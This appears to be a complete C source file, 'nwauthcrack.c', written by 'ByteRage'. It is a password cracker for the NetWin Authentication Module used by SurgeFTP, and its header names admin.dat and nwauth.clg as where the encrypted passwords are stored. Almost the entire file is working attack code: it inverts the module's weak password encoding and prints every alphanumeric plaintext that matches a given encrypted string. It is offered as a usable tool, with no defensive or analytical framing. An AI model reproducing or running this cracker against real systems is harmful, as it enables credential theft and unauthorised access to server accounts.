/********************************************************************
 * nwauthcrack.c - NetWin Authentication Module password cracker    *
 * the SurgeFTP encrypted passwords can be found in the admin.dat & *
 * nwauth.clg files in the nwauth.exe directory                     *
 * by [ByteRage] <byterage@yahoo.com> [http://www.byterage.cjb.net] *
 ********************************************************************/

#include <string.h>
#include <stdio.h>

FILE *fh;
/* the following table indices refer to the characters our
   generated password may consist of (true/false), since
   we don't want to go into too much trouble when typing
   everything in :) */
const char okaychars[256] = {
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,
0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,
0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,
1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,
};

/* DECRYPTION ALGORITHMS */
int enumpwds(unsigned char encrypted[]) {
  int heavycrypt0;
  unsigned int num=0, i, x;
  unsigned char j[256], decrypted[256];
  for(i=0; i<256;i++) { j[i] = 0; }
brute:
  heavycrypt0 = (unsigned char)encrypted[1]*255+(unsigned char)encrypted[0];
  for(i=0; i+2 < strlen(encrypted); i++) {
    for(x=j[i]; x < 256; x++) {
	  if ((x * (heavycrypt0+1) % 40 == (encrypted[i+2]-0x41)) & okaychars[x]) {
	    decrypted[i] = x;
		break;
	  }
    }
	if (x == 256) {
next:
	  if (i == 0) return num;
	  if (j[i-1] < 256) { j[i-1] = decrypted[i-1]+1; x = i; } else { i--; goto next; }
	  for (i=x; i < 256; i++) { j[i] = 0; }
	  goto brute;
	}
	heavycrypt0 += x; heavycrypt0 *= 3; heavycrypt0 %= 0x7D00;
  }
  decrypted[i] = '\x00';
  num++;
  printf("%s\n", decrypted);  
  if (j[i-1] < 256) { j[i-1] = decrypted[i-1]+1; x = i; } else { i--; goto next; }
  for (i=x; i < 256; i++) { j[i] = 0; }
  goto brute;
}
/* DECRYPTION ALGORITHMS END */

void main(int argc, char ** argv) {
  char buf[256]; int k, l;

  printf("NetWin Authentication Module password cracker by [ByteRage]\n\n");
  
  if (argc < 2) { printf("Syntax : %s <password>\n", argv[0]); return; }
  printf("%s ->\n",argv[1]);
  
  printf("\n%d passwords found for %s\n",enumpwds(argv[1]),argv[1]);
}
